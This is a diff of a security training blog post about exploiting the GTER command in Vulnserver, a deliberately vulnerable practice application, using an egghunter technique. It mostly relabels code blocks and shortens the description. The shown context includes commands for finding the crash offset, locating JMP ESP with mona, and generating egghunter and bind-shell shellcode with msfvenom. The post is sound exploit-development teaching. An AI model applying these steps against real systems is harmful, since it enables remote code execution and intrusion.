@@ -5,7 +5,7 @@
 :tags: osce, vulnserver, training, exploit
 :image: cover.png
 :alt: Photo by Pel on Unsplash
-:description: Vulnserver is a VbD application focused on helping people practice exploiting skills. This post will describe the steps taken to exploit the GTER command. Besides, it will outline a technique called 'Egghunting,' used when there are space restrictions for our exploitation.
+:description: This post will describe the steps taken to exploit the Vulnserver GTER command. using a technique called 'Egghunting'.
 :keywords: Bussiness, Information, Security, Protection, Hacking, Exploit, OSCE
 :author: Andres Roldan
 :writer: aroldan
@@ -127,7 +127,7 @@ To do that, we will use `pattern_create.rb` from `Metasploit` to create a
 cyclic pattern.
 
 .Running pattern_create.rb
-[source,bash]
+[source,console]
 ----
 # This will only work on Kali Linux
 $ msf-pattern_create -l 400
@@ -163,7 +163,7 @@ This time, `EIP` has the value `41396541`.
 Let's check the offset on our cyclic pattern:
 
 .Running pattern_offset.rb
-[source,bash]
+[source,console]
 ----
 # This will only work on Kali Linux
 $ msf-pattern_offset -q 41396541
@@ -208,7 +208,7 @@ we can jump to `ESP` to gain control of the execution flow.
 We can use `mona.py` plugin to find that instruction:
 
 .mona looking for JMP ESP
-[source,bash]
+[source,console]
 ----
 ! mona jmp -r esp -o -cp nonull
 ----
@@ -334,7 +334,7 @@ it finds that `egg`, it will execute any code that follows.
 First, we need to create our egghunter shellcode:
 
 .Creating egghunter
-[source,bash]
+[source,console]
 ----
 $ msf-egghunter -e w00t -f python -v EGGHUNTER
 EGGHUNTER =  b""
@@ -397,7 +397,7 @@ that will bind a shell on port `4444`:
 
 
 .Creating shellcode
-[source,bash]
+[source,console]
 ----
 $ msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
